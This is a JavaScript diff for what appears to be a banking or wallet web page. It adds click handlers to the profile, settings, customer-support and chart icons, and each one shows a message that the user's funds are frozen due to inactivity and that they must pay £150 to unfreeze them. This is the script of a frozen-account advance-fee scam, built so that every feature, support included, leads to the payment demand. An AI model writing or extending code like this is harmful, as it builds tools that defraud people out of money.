@@ -29,6 +29,23 @@ document.getElementById('withdrawBtn').addEventListener('click', function() {
     showFrozenMessage();
 });
 
+// NEW: Icon click handlers with demo messages
+document.getElementById('profileIcon').addEventListener('click', function() {
+    alert('📱 Profile Page (Demo)\n\nFunds are frozen due to inactivity. Kindly pay £150 to unfreeze and access profile features.');
+});
+
+document.getElementById('settingsIcon').addEventListener('click', function() {
+    alert('⚙️ Settings (Demo)\n\nFunds are frozen due to inactivity. Kindly pay £150 to unfreeze and change settings.');
+});
+
+document.getElementById('csIcon').addEventListener('click', function() {
+    alert('💬 Customer Support (Demo)\n\nFunds are frozen due to inactivity. Kindly pay £150 to unfreeze and contact support.');
+});
+
+document.getElementById('chartIcon').addEventListener('click', function() {
+    alert('📊 Analytics Dashboard (Demo)\n\nFunds are frozen due to inactivity. Kindly pay £150 to unfreeze and view charts.');
+});
+
 // Logout functionality
 document.getElementById('logoutBtn').addEventListener('click', function() {
     localStorage.removeItem('isLoggedIn');
